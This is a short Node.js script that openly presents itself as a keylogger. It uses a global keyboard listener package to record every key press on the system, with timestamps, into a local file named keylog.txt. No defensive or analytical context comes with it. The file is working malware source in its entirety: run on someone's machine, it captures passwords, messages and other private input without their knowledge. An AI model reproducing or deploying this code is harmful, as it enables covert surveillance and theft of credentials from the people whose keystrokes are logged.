const fs = require('fs');
const path = require('path');
const { GlobalKeyboardListener } = require("node-global-key-listener");

// Log file path
const logFile = path.join(__dirname, 'keylog.txt');

// Function to log keystrokes
const logKeystroke = (key) => {
    const logMessage = `${new Date().toISOString()} - Key pressed: ${key}\n`;
    fs.appendFile(logFile, logMessage, (err) => {
        if (err) {
            console.error('Failed to log keystroke:', err);
        }
    });
};

// Initialize the global keyboard listener
const listener = new GlobalKeyboardListener();

// Monitor keystrokes
listener.addListener((e) => {
    if (e.state === "DOWN") {
        logKeystroke(e.name);
    }
});

console.log('Keylogger started. Press keys to log...');
